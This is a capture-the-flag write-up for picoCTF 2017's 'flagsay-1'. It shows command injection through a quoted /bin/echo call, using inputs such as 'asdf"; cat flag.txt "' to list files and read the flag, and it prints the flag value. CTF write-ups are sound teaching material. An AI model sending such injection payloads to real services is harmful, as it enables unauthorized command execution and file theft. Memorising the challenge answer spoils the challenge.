## flagsay-1 - 80

### Description

I heard you like flags, so now you can make your own! Exhilarating! Use [flagsay-1](./flagsay-1)! [Source](./flagsay-1.c). Connect on shell2017.picoctf.com:29903.

### Hint

  - System will run exactly what the program gives it

### Write up

The program reads user input, store it to `flag` and prints it by

    /bin/echo "<flag>"

For example,

    $ nc localhost 29903
    asdf
                   _                                        
                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
                 //asdf                               /     
                //                                   /      
               //                                   /       
              //                                   /        
             //                                   /         
            //                                   /          
           //___________________________________/           
          //                                                
         //                                                 
        //                                                  
       //                                                   
      //                                                    
     //

Then, what will happen if we give `"` included input?

    $ nc localhost 29903
    asdf"
                   _                                        
                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
                 //asdf /
    sh: 4: //: Permission denied
    sh: 5: //: Permission denied
    sh: 6: //: Permission denied
    sh: 7: //: Permission denied
    sh: 8: //: Permission denied
    sh: 9: //___________________________________/: not found
    sh: 10: //: Permission denied
    sh: 11: //: Permission denied
    sh: 12: //: Permission denied
    sh: 13: //: Permission denied
    sh: 14: //: Permission denied
    sh: 15: //: Permission denied
    sh: 17: Syntax error: Unterminated quoted string

It gives an error, so the command injection is possible.

    $ nc localhost 29903
    asdf"; ls * "
                   _                                        
                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
                 //asdf
    ls: cannot access                       /     
                //                                   /      
               //                                   /       
              //                                   /        
             //                                   /         
            //                                   /          
           //___________________________________/           
          //                                                
         //                                                 
        //                                                  
       //                                                   
      //                                                    
     //                                                     
    : No such file or directory
    flagsay-1
    flagsay-1_no_aslr
    flag.txt
    xinetd_wrapper.sh

By using ls command, it is found that there is a flag.txt file.

    $ nc localhost 29903
    asdf"; cat flag.txt "
                   _                                        
                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
                 //asdf
    0464df9449a05803b955208c50827420
    cat:               /     
    ...

By using cat command, flag can be retrieved.


> 0464df9449a05803b955208c50827420
